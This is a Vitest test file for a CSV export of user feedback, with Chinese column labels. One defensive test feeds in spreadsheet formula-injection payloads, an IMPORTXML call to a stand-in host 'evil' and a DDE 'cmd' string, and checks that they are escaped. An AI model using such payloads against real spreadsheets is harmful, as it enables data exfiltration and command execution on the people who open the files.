import { describe, expect, it } from "vitest"
import type { FeedbackListItem } from "@/lib/api"
import { toCsv } from "@/lib/csv"

function item(overrides: Partial<FeedbackListItem>): FeedbackListItem {
  return {
    id: "f1",
    type: "bug",
    message: "占位",
    source: "widget",
    status: "open",
    priority: "none",
    tags: [],
    project_id: "p1",
    created_at: "2026-08-24T09:12:00Z",
    updated_at: "2026-08-24T09:12:00Z",
    ...overrides,
  }
}

const noMembers = () => null

describe("toCsv", () => {
  it("quotes embedded quotes, commas and newlines, and separates rows with CRLF", () => {
    const csv = toCsv([item({ message: '他说 "行, 但是"\n换行' })], noMembers)
    const [head, row] = csv.split("\r\n")

    expect(head?.startsWith('"提交时间","类型"')).toBe(true)
    expect(row).toContain('"他说 ""行, 但是""\n换行"')
    expect(csv.split("\r\n")).toHaveLength(2)
  })

  it("neutralises cells a spreadsheet would evaluate", () => {
    // message and tags are free text from anyone who can reach the widget.
    const csv = toCsv(
      [item({ message: '=IMPORTXML("https://evil/"&A1)', tags: ["+cmd|'/c calc'!A1"] })],
      noMembers,
    )

    expect(csv).toContain('"\'=IMPORTXML(""https://evil/""&A1)"')
    expect(csv).toContain('"\'+cmd|\'/c calc\'!A1"')
    expect(csv).not.toContain('"=IMPORTXML')
  })

  it("names the submitter and their source, falling back to 匿名", () => {
    const csv = toCsv(
      [
        item({
          contact_email: "chen.wei@example.com",
          url: "https://example.com/pricing",
          user_agent: "Chrome/128.0.0.0",
        }),
        item({ contact_email: null }),
      ],
      noMembers,
    )

    expect(csv).toContain('"chen.wei@example.com","用户提交","example.com/pricing · Chrome 128"')
    expect(csv).toContain('"匿名","用户提交",""')
  })

  it("distinguishes a report the team filed from a customer's", () => {
    const csv = toCsv([item({ source: "internal" })], noMembers)

    expect(csv).toContain('"内部反馈"')
    expect(csv).not.toContain('"用户提交"')
  })
})
